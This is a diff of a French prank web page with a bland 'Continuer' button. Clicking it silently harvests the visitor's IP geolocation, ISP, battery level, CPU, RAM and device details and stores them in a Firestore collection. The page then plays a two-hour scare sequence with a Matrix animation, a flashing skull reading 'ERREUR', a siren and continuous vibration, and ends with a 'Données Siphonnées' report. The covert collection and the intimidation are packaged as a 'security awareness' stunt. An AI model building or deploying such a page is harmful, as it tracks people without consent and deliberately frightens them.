@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>...</title>
+    <title>Accès Sécurisé</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -21,113 +21,114 @@
         .mono { font-family: 'JetBrains Mono', monospace; }
         .fade-in { opacity: 0; animation: fadeIn 0.8s ease-out forwards; }
         @keyframes fadeIn { to { opacity: 1; } }
-        
+
+        /* Animation de l'alarme (Flash Rouge par-dessus le Matrix) */
+        .panic-overlay { animation: flashOverlay 0.2s infinite; mix-blend-mode: screen; pointer-events: none; }
+        @keyframes flashOverlay {
+            0%, 49% { background-color: rgba(220, 38, 38, 0.4); } /* Teinte rouge sang */
+            50%, 100% { background-color: transparent; }
+        }
+
+        /* Texte ERREUR et Crâne qui tremblent (Glitch) */
+        .glitch-item { animation: glitch 0.15s infinite; }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-4px, 4px); filter: drop-shadow(2px 0px 0px #0f0); }
+            40% { transform: translate(-4px, -4px); filter: none; }
+            60% { transform: translate(4px, 4px); filter: drop-shadow(-2px 0px 0px #f00); }
+            80% { transform: translate(4px, -4px); filter: none; }
+            100% { transform: translate(0); }
+        }
+
         .scan-line {
             width: 100%; height: 2px; background: rgba(239, 68, 68, 0.4);
             position: absolute; top: 0; left: 0; z-index: 10;
             animation: scan 3s linear infinite;
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
-        .target-circle {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 80px; height: 80px; border: 2px solid rgba(239, 68, 68, 0.6);
-            border-radius: 50%; z-index: 11; pointer-events: none;
-            animation: pulse-red 2s infinite;
-        }
-        @keyframes pulse-red {
-            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.8; }
-            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0; }
-        }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative">
+<body id="main-body" class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative transition-colors duration-75">
 
-    <!-- Étape 1 : Le bouton minimaliste sur écran noir -->
+    <!-- Étape 1 : Le bouton PRO sur écran noir -->
     <div id="step-1" class="w-full h-full absolute inset-0 z-20 transition-opacity duration-500">
-        <!-- Texte central mystérieux et Logo Hacker Agressif -->
-        <div class="absolute inset-0 flex flex-col items-center justify-center pointer-events-none">
-            <h1 class="text-zinc-400 text-xl md:text-2xl font-mono uppercase tracking-[0.8em] opacity-40 ml-4">Level Up</h1>
+        <div class="absolute inset-0 flex flex-col items-center justify-center">
             
-            <!-- Logo Cyber-Skull Menacing (Rouge Pulsant) -->
-            <svg class="w-16 h-16 mt-8 text-red-600 opacity-60 animate-pulse" style="filter: drop-shadow(0px 0px 10px rgba(220, 38, 38, 0.9));" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
-                <!-- Réticule de visée Cyber -->
-                <circle cx="12" cy="12" r="11" stroke-width="0.5" stroke-dasharray="2 4" class="text-red-500"></circle>
-                <line x1="12" y1="1" x2="12" y2="4" stroke-width="1"></line>
-                <line x1="12" y1="20" x2="12" y2="23" stroke-width="1"></line>
-                <line x1="1" y1="12" x2="4" y2="12" stroke-width="1"></line>
-                <line x1="20" y1="12" x2="23" y2="12" stroke-width="1"></line>
-                
-                <!-- Forme du crâne féroce -->
-                <path d="M12 4C8.5 4 6 6.5 6 10c0 2.5 1 4 2.5 5.5l.5 3.5h6l.5-3.5C17 14 18 12.5 18 10c0-3.5-2.5-6-6-6z" fill="#000000" stroke="currentColor" stroke-width="1.2"></path>
-                
-                <!-- Yeux démoniaques (remplis) -->
-                <polygon points="7.5,10 10.5,11.5 11,8.5" fill="currentColor" stroke="none"></polygon>
-                <polygon points="16.5,10 13.5,11.5 13,8.5" fill="currentColor" stroke="none"></polygon>
-                
-                <!-- Fente nasale agressive -->
-                <polygon points="12,12.5 11,15 13,15" fill="currentColor" stroke="none"></polygon>
-                
-                <!-- Dents tranchantes et cicatrices -->
-                <line x1="9.5" y1="17" x2="14.5" y2="17" stroke-width="1.5"></line>
-                <line x1="10.5" y1="16" x2="10.5" y2="18.5" stroke-width="1.2"></line>
-                <line x1="12" y1="16" x2="12" y2="19" stroke-width="1.2"></line>
-                <line x1="13.5" y1="16" x2="13.5" y2="18.5" stroke-width="1.2"></line>
-                
-                <!-- Griffures cybernétiques -->
-                <path d="M4 6l3 2" stroke-width="0.8"></path>
-                <path d="M20 6l-3 2" stroke-width="0.8"></path>
-            </svg>
+            <!-- Le texte Level Up mystérieux -->
+            <h1 class="text-zinc-400 text-2xl md:text-3xl font-mono uppercase tracking-[0.8em] opacity-50 ml-4 mb-12">Level Up</h1>
+            
+            <!-- Le bouton Continuer ultra-pro et épuré -->
+            <button id="unlock-btn" class="group flex items-center justify-center outline-none bg-transparent border border-zinc-800 hover:border-zinc-500 hover:bg-zinc-900/80 px-10 py-3.5 rounded-sm cursor-pointer transition-all duration-500">
+                <span class="text-[10px] font-mono text-zinc-500 uppercase tracking-[0.4em] group-hover:text-zinc-200 transition-colors duration-500">Continuer</span>
+            </button>
+
         </div>
-        
-        <!-- Bouton ultra discret en bas à gauche (invisible pour eux) -->
-        <button id="unlock-btn" class="absolute bottom-2 left-2 text-[4px] font-thin tracking-[0.5em] text-zinc-900 hover:text-zinc-700 uppercase font-mono transition-colors duration-500 cursor-pointer outline-none bg-transparent border-none p-2 opacity-50">
-            Entrer
-        </button>
     </div>
 
-    <!-- Étape 2 : L'écran noir total (Chargement) -->
+    <!-- Étape 2 : L'écran noir total (Silence de 3 secondes) -->
     <div id="step-loading" class="hidden absolute inset-0 z-10 bg-black w-full h-full"></div>
 
-    <!-- Étape 3 : La Révélation (Le Rapport Densifié) -->
-    <div id="step-2" class="hidden bg-white p-3.5 rounded-[1.5rem] shadow-2xl w-full max-w-sm flex-col items-center border border-red-500/20 z-30 fade-in text-slate-900 overflow-y-auto max-h-[98vh]">
-        <div class="inline-flex items-center gap-2 bg-red-50 text-red-600 px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-[0.2em] mb-2 border border-red-100 text-center">
-            <span class="w-1.5 h-1.5 bg-red-600 rounded-full animate-pulse"></span>
-            Sécurité Compromise
+    <!-- Étape PANIC MODE : Le Chaos Total avec Matrix en arrière-plan -->
+    <div id="step-panic" class="hidden absolute inset-0 z-40 flex-col items-center justify-center w-full h-full bg-black overflow-hidden">
+        
+        <!-- Le fond Matrix Vert -->
+        <canvas id="matrix-canvas" class="absolute inset-0 z-0 opacity-80"></canvas>
+        
+        <!-- Le Flash Rouge Par-dessus -->
+        <div class="absolute inset-0 z-10 panic-overlay"></div>
+
+        <!-- Le contenu central qui glitch -->
+        <div class="relative z-20 flex flex-col items-center">
+            <!-- Logo Cyber-Skull -->
+            <svg class="w-32 h-32 text-white glitch-item mb-6" style="filter: drop-shadow(0px 0px 20px rgba(255, 255, 255, 0.8));" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 4C8.5 4 6 6.5 6 10c0 2.5 1 4 2.5 5.5l.5 3.5h6l.5-3.5C17 14 18 12.5 18 10c0-3.5-2.5-6-6-6z" fill="#000000" stroke="currentColor"></path>
+                <polygon points="7.5,10 10.5,11.5 11,8.5" fill="currentColor" stroke="none"></polygon>
+                <polygon points="16.5,10 13.5,11.5 13,8.5" fill="currentColor" stroke="none"></polygon>
+                <polygon points="12,12.5 11,15 13,15" fill="currentColor" stroke="none"></polygon>
+                <line x1="9.5" y1="17" x2="14.5" y2="17" stroke-width="2"></line>
+                <line x1="10.5" y1="16" x2="10.5" y2="18.5" stroke-width="2"></line>
+                <line x1="12" y1="16" x2="12" y2="19" stroke-width="2"></line>
+                <line x1="13.5" y1="16" x2="13.5" y2="18.5" stroke-width="2"></line>
+            </svg>
+
+            <h1 class="text-6xl md:text-8xl font-black font-mono tracking-widest glitch-item text-white">ERREUR</h1>
+            <h2 class="text-xl md:text-3xl font-bold font-mono mt-4 text-red-500 uppercase tracking-widest glitch-item">LevelUp</h2>
+        </div>
+    </div>
+
+    <!-- Étape Finale : La Révélation (Le Rapport au milieu du chaos) -->
+    <div id="step-2" class="hidden bg-white/95 backdrop-blur-md p-3.5 rounded-[1.5rem] shadow-[0_0_50px_rgba(239,68,68,0.8)] w-full max-w-sm flex-col items-center border-2 border-red-500 z-50 text-slate-900 overflow-y-auto max-h-[98vh]">
+        <div class="inline-flex items-center gap-2 bg-red-600 text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-[0.2em] mb-2 border border-red-800 text-center mt-2 animate-pulse shadow-lg">
+            <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+            Données Siphonnées
         </div>
 
-        <h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight">Rapport d'Exposition</h2>
-        <p class="text-slate-400 text-[8px] mb-3 text-center px-4 leading-tight uppercase font-bold tracking-widest">Empreinte Numérique Capturée</p>
+        <h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight uppercase">Rapport d'Exposition</h2>
 
-        <div class="w-full space-y-1.5">
-            <!-- Grille d'Infos (Compacte) -->
-            <div class="bg-slate-50 border border-slate-100 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px]">
-                
-                <!-- ID & Date -->
+        <div class="w-full space-y-1.5 mt-3">
+            <div class="bg-slate-50 border border-slate-200 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px] shadow-inner">
                 <div class="flex flex-col">
-                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-0.5">ID Session</span>
-                    <span id="display-name" class="font-bold text-slate-900 mono">...</span>
+                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">ID Session</span>
+                    <span id="display-name" class="font-black text-red-600 mono text-[10px]">...</span>
                 </div>
                 <div class="flex flex-col text-right">
-                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-0.5">Capture</span>
+                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">Heure du Clic</span>
                     <span id="display-date" class="font-bold text-slate-900 mono">...</span>
                 </div>
 
-                <!-- Réseau & FAI -->
-                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
+                <div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
                     <div class="flex justify-between items-center mb-1">
-                        <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px]">Réseau / FAI</span>
-                        <span id="display-conn" class="font-bold text-blue-500 text-[8px] bg-blue-50 px-1.5 py-0.5 rounded">...</span>
+                        <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px]">Réseau / FAI</span>
+                        <span id="display-conn" class="font-bold text-white text-[8px] bg-red-500 px-1.5 py-0.5 rounded">...</span>
                     </div>
                     <div class="flex justify-between items-center">
-                        <span id="display-ip" class="font-bold text-blue-600 mono text-[11px]">...</span>
+                        <span id="display-ip" class="font-bold text-slate-900 mono text-[12px] tracking-wider">...</span>
                         <span id="display-isp" class="font-bold text-slate-700 truncate max-w-[100px]">...</span>
                     </div>
                 </div>
 
-                <!-- Matériel (Nouveau) -->
-                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
-                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-1.5">Spécifications Matérielles</span>
+                <div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
+                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-1.5">Matériel Détecté</span>
                     <div class="flex justify-between items-center">
                         <div class="flex items-center gap-1.5">
                             <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m14-6h2m-2 6h2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg></span>
@@ -138,36 +139,14 @@
                             <span id="display-ram" class="font-bold text-slate-800">...</span>
                         </div>
                         <div class="flex items-center gap-1.5">
-                            <div id="battery-icon-container" class="text-green-500"></div>
+                            <div id="battery-icon-container" class="text-red-500"></div>
                             <span id="display-battery" class="font-bold text-slate-800">...</span>
                         </div>
                     </div>
                 </div>
-
-                <!-- Logiciel & Écran (Nouveau) -->
-                <div class="flex flex-col col-span-2 border-t border-slate-200/50 pt-2.5">
-                    <span class="font-bold text-slate-400 uppercase tracking-widest text-[7px] mb-1.5">Système & Navigateur</span>
-                    <div class="flex justify-between items-center">
-                        <div class="flex items-center gap-1.5 truncate max-w-[45%]">
-                            <div id="os-icon-container" class="text-slate-500"></div>
-                            <span id="display-system" class="font-bold text-slate-800 truncate">...</span>
-                        </div>
-                        <div class="flex items-center gap-1.5">
-                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg></span>
-                            <span id="display-screen" class="font-bold text-slate-800 mono">...</span>
-                        </div>
-                    </div>
-                </div>
-
             </div>
 
-            <!-- Carte Google Maps -->
-            <div class="relative w-full h-24 bg-slate-200 rounded-[1rem] overflow-hidden border border-slate-200 shadow-inner">
-                <div class="scan-line"></div><div class="target-circle"></div>
-                <iframe id="display-map" width="100%" height="100%" frameborder="0" style="border:0;" src="" loading="lazy"></iframe>
-            </div>
-
-            <div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-between text-white">
+            <div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-between text-white shadow-md">
                 <div class="flex items-center gap-2">
                     <img id="display-flag" src="" alt="Flag" class="hidden w-4 h-2.5 object-cover rounded-sm">
                     <span id="display-location" class="text-[9px] font-bold uppercase tracking-widest truncate">...</span>
@@ -176,7 +155,7 @@
             </div>
         </div>
 
-        <p class="text-[8px] font-bold text-slate-400 italic mt-3">Ne cliquez jamais sur un bouton inconnu.</p>
+        <p class="text-[9px] font-black text-red-600 uppercase tracking-widest mt-4 mb-2 animate-pulse">Ne cliquez jamais au hasard.</p>
     </div>
 
     <script type="module">
@@ -195,56 +174,160 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        const osIcons = {
-            iphone: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.1 2.48-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83zM13 3.5c.73-.89 1.22-2.14 1.08-3.38-1.06.04-2.34.71-3.1 1.6-.68.79-1.28 2.06-1.12 3.26 1.18.09 2.39-.59 3.14-1.48z"/></svg>`,
-            android: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M17.523 15.3414C17.0609 15.3414 16.6917 14.9723 16.6917 14.5101C16.6917 14.048 17.0609 13.6788 17.523 13.6788C17.9852 13.6788 18.3543 14.048 18.3543 14.5101C18.3543 14.9723 17.9852 15.3414 17.523 15.3414ZM6.47611 15.3414C6.01402 15.3414 5.64478 14.9723 5.64478 14.5101C5.64478 14.048 6.01402 13.6788 6.47611 13.6788C6.93836 13.6788 7.30744 14.048 7.30744 14.5101C7.30744 14.9723 6.93836 15.3414 6.47611 15.3414ZM17.9252 10.7412L19.7891 7.51352C19.897 7.32671 19.8329 7.08779 19.6462 6.97987C19.4594 6.87187 19.2204 6.93602 19.1124 7.12283L17.221 10.397C15.7196 9.71181 14.0041 9.32432 12.1994 9.32432C10.3948 9.32432 8.67931 9.71181 7.17792 10.397L5.28652 7.12283C5.17852 6.93602 4.93952 6.87187 4.75271 6.97987C4.56598 7.08779 4.50191 7.32671 4.60991 7.51352L6.47371 10.7412C2.86872 12.6953 0.444336 16.3776 0.444336 20.6757H23.9546C23.9546 16.3776 21.5302 12.6953 17.9252 10.7412Z"/></svg>`,
-            windows: `<svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24"><path d="M0 3.449L9.75 2.1V11.7H0V3.449zm0 17.102L9.75 21.9V12.3H0v8.251zM11.25 1.899L24 0v11.7H11.25V1.899zm12.75 22.101L11.25 22.2V12.3H24v11.7z"/></svg>`,
-            default: `<svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>`
-        };
+        // ==========================================
+        // EFFET CODE MATRIX (Lignes vertes)
+        // ==========================================
+        let matrixInterval;
+        function startMatrixEffect() {
+            const canvas = document.getElementById('matrix-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            // Caractères type hacker (Katakana, symboles, chiffres)
+            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=<>?/:;';
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            
+            const drops = [];
+            for(let x = 0; x < columns; x++) drops[x] = 1;
+            
+            function drawMatrix() {
+                // Fond noir semi-transparent pour laisser la traînée
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // Couleur verte du code
+                ctx.fillStyle = '#0f0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            // Vitesse de la pluie
+            matrixInterval = setInterval(drawMatrix, 33);
+        }
 
+        function stopMatrixEffect() {
+            clearInterval(matrixInterval);
+        }
+
+        // ==========================================
+        // SYSTÈME AUDIO (Sirène Continue)
+        // ==========================================
+        let audioCtx, masterGain;
+        let isAudioInit = false;
+
+        function initScarySiren() {
+            if (isAudioInit) return;
+            try {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc1 = audioCtx.createOscillator();
+                const osc2 = audioCtx.createOscillator();
+                const lfo = audioCtx.createOscillator();
+                masterGain = audioCtx.createGain();
+
+                osc1.type = 'sawtooth';
+                osc2.type = 'square';
+                lfo.type = 'sine';
+
+                lfo.frequency.value = 5; 
+                const lfoGain = audioCtx.createGain();
+                lfoGain.gain.value = 400; 
+
+                lfo.connect(lfoGain);
+                lfoGain.connect(osc1.frequency);
+                lfoGain.connect(osc2.frequency);
+
+                osc1.frequency.value = 700;
+                osc2.frequency.value = 750; 
+
+                osc1.connect(masterGain);
+                osc2.connect(masterGain);
+                masterGain.connect(audioCtx.destination);
+
+                masterGain.gain.value = 0; 
+
+                osc1.start();
+                osc2.start();
+                lfo.start();
+                isAudioInit = true;
+            } catch(e) { console.log("Audio non supporté"); }
+        }
+
+        function playSiren() {
+            if (!isAudioInit) initScarySiren();
+            if (masterGain && audioCtx) {
+                masterGain.gain.setTargetAtTime(0.2, audioCtx.currentTime, 0.05);
+            }
+        }
+
+        function pauseSiren() {
+            if (masterGain && audioCtx) {
+                masterGain.gain.setTargetAtTime(0, audioCtx.currentTime, 0.05);
+            }
+        }
+
+        // ==========================================
+        // SYSTÈME DE VIBRATION (En Continu)
+        // ==========================================
+        let vibeInterval;
+        function playVibration() {
+            if (navigator.vibrate) {
+                navigator.vibrate([400, 100, 400, 100, 800, 200]);
+                vibeInterval = setInterval(() => {
+                    navigator.vibrate([400, 100, 400, 100, 800, 200]);
+                }, 2000);
+            }
+        }
+        function pauseVibration() {
+            clearInterval(vibeInterval);
+            if (navigator.vibrate) navigator.vibrate(0); 
+        }
+
+        // ==========================================
+        // INFOS MATÉRIEL
+        // ==========================================
         function getDetailedDeviceInfo() {
             const ua = navigator.userAgent;
-            let name = "PC Bureau"; let icon = osIcons.windows;
+            let name = "PC Bureau";
             let browser = "Navigateur Inconnu";
 
             if (ua.includes("Firefox")) browser = "Firefox";
             else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
             else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
-            else if (ua.includes("Trident")) browser = "Internet Explorer";
             else if (ua.includes("Edge") || ua.includes("Edg")) browser = "Edge";
             else if (ua.includes("Chrome")) browser = "Chrome";
             else if (ua.includes("Safari")) browser = "Safari";
 
-            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone/iPad"; icon = osIcons.iphone; }
+            if (/iPhone|iPad|iPod/i.test(ua)) { name = "Apple iPhone"; }
             else if (/Android/i.test(ua)) {
-                icon = osIcons.android;
                 if (/Samsung|SM-|GT-/i.test(ua)) name = "Samsung Galaxy";
                 else if (/Huawei|Honor/i.test(ua)) name = "Huawei Device";
                 else if (/Pixel/i.test(ua)) name = "Google Pixel";
                 else name = "Appareil Android";
             }
-            else if (/Mac/i.test(ua)) { name = "Apple Mac"; icon = osIcons.iphone; }
+            else if (/Mac/i.test(ua)) { name = "Apple Mac"; }
 
-            return { name, icon, browser };
-        }
-
-        async function getBatterySVG(level) {
-            const displayLevel = isNaN(level) ? 100 : level;
-            const color = displayLevel > 20 ? '#22c55e' : '#ef4444';
-            return `<svg class="w-3.5 h-3.5" fill="none" stroke="${color}" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (displayLevel/100)*12)}" height="6" fill="${color}" stroke="none" /></svg>`;
+            return { name, browser };
         }
 
         async function processClick() {
             let geoData = {}; let batteryLevel = "100";
             const now = new Date();
-            const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const dateStr = now.toLocaleDateString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
             
-            const sessionId = 'ID-' + Math.random().toString(36).substr(2, 6).toUpperCase();
-
-            // Nouvelles données de Fingerprinting matériel
+            const sessionId = 'CRIT-' + Math.random().toString(36).substr(2, 6).toUpperCase();
             const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Inconnu";
             const ram = navigator.deviceMemory ? navigator.deviceMemory + " Go RAM" : "Inconnue";
-            const screenRes = window.screen.width + "x" + window.screen.height;
             const connType = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "WIFI/LAN";
 
             try {
@@ -265,71 +348,86 @@
                 pays: geoData.country || "Inconnu", 
                 isp: geoData.organization || "Inconnu", 
                 batterie: batteryLevel + "%", 
-                os: dev.name,
-                navigateur: dev.browser,
-                cpu: cores,
-                ram: ram,
-                ecran: screenRes,
-                reseau: connType,
-                date_clic: serverTimestamp() 
+                os: dev.name, navigateur: dev.browser, cpu: cores, ram: ram, reseau: connType, date_clic: serverTimestamp() 
             };
             
             try { await addDoc(collection(db, "visites_mysteres"), data); } catch(e) {}
-
-            return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, screenRes, connType };
+            return { ...geoData, batteryLevel, dev, dateStr, sessionId, cores, ram, connType };
         }
 
         document.getElementById('unlock-btn').addEventListener('click', async () => {
+            // 0. Autoriser l'audio
+            initScarySiren();
+
+            // 1. Clic -> Disparition
             const step1 = document.getElementById('step-1');
             step1.style.opacity = '0';
-            
             setTimeout(() => {
                 step1.classList.add('hidden');
                 document.getElementById('step-loading').classList.remove('hidden');
             }, 500);
             
+            // Récupère les données en douce
             const dataPromise = processClick();
             
-            // Attente aléatoire entre 50 minutes et 1 heure (3000000 ms à 3600000 ms) dans le noir complet
-            const tempsAttenteMs = Math.floor(Math.random() * (3600000 - 3000000 + 1)) + 3000000;
-            await new Promise(r => setTimeout(r, tempsAttenteMs));
-            
-            const data = await dataPromise;
-            
-            // Remplissage des données
-            document.getElementById('display-date').textContent = data.dateStr;
-            document.getElementById('display-name').textContent = data.sessionId;
-            document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
-            document.getElementById('display-isp').textContent = data.organization || "Fournisseur Inconnu";
-            document.getElementById('display-conn').textContent = data.connType;
-            
-            // Matériel
-            document.getElementById('display-cpu').textContent = data.cores;
-            document.getElementById('display-ram').textContent = data.ram;
-            document.getElementById('display-battery').textContent = data.batteryLevel + "%";
-            document.getElementById('battery-icon-container').innerHTML = await getBatterySVG(parseInt(data.batteryLevel));
-            
-            // Logiciel
-            document.getElementById('display-system').textContent = data.dev.name;
-            document.getElementById('os-icon-container').innerHTML = data.dev.icon;
-            document.getElementById('display-screen').textContent = data.screenRes;
-            document.getElementById('display-browser').textContent = data.dev.browser;
-            
-            // Carte et Localisation
-            const locText = (data.city ? data.city + ", " : "") + (data.country || "Inconnu");
-            document.getElementById('display-location').textContent = locText;
-            document.getElementById('display-map').src = `https://maps.google.com/maps?q=${encodeURIComponent(locText)}&t=k&z=14&ie=UTF8&iwloc=&output=embed`;
-            
-            if (data.country_code) { 
-                document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`; 
-                document.getElementById('display-flag').classList.remove('hidden'); 
-            }
-            
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+            // 2. Le Calme avant la tempête (3 secondes)
+            await new Promise(r => setTimeout(r, 3000));
             
             document.getElementById('step-loading').classList.add('hidden');
-            document.getElementById('step-2').classList.remove('hidden');
-            document.getElementById('step-2').classList.add('flex');
+            
+            // ==========================================
+            // LA PANIQUE (Pendant les 2 heures avec Matrix)
+            // ==========================================
+            const panicScreen = document.getElementById('step-panic');
+            
+            panicScreen.classList.remove('hidden');
+            panicScreen.classList.add('flex');
+            
+            startMatrixEffect(); // Lancement de la pluie de code vert !
+            playSiren();
+            playVibration();
+
+            // ==========================================
+            // FIN DE LA DÉMO (Au bout des 2 heures)
+            // ==========================================
+            // TEST : Change 7200000 à 15000 (15 secondes) pour tester l'effet
+            const tempsTotalMs = 7200000; 
+
+            setTimeout(async () => {
+                // Tout éteindre
+                panicScreen.classList.add('hidden');
+                panicScreen.classList.remove('flex');
+                stopMatrixEffect();
+                pauseSiren();
+                pauseVibration();
+
+                // Afficher le rapport final par-dessus
+                const data = await dataPromise;
+                
+                document.getElementById('display-date').textContent = data.dateStr;
+                document.getElementById('display-name').textContent = data.sessionId;
+                document.getElementById('display-ip').textContent = data.ip || "127.0.0.1";
+                document.getElementById('display-isp').textContent = data.organization || "Inconnu";
+                document.getElementById('display-conn').textContent = data.connType;
+                document.getElementById('display-cpu').textContent = data.cores;
+                document.getElementById('display-ram').textContent = data.ram;
+                document.getElementById('display-battery').textContent = data.batteryLevel + "%";
+                document.getElementById('battery-icon-container').innerHTML = `<svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="7" width="16" height="10" rx="2" /><path d="M21 10v4" /><rect x="4" y="9" width="${Math.max(1, (parseInt(data.batteryLevel)/100)*12)}" height="6" fill="currentColor" stroke="none" /></svg>`;
+                document.getElementById('display-cpu').textContent = data.dev.name;
+                document.getElementById('display-browser').textContent = data.dev.browser;
+                
+                const locText = (data.city ? data.city + ", " : "") + (data.country || "Inconnu");
+                document.getElementById('display-location').textContent = locText;
+                
+                if (data.country_code) { 
+                    document.getElementById('display-flag').src = `https://flagcdn.com/w40/${data.country_code.toLowerCase()}.png`; 
+                    document.getElementById('display-flag').classList.remove('hidden'); 
+                }
+                
+                const step2 = document.getElementById('step-2');
+                step2.classList.remove('hidden');
+                step2.classList.add('flex');
+            }, tempsTotalMs);
         });
     </script>
 </body>
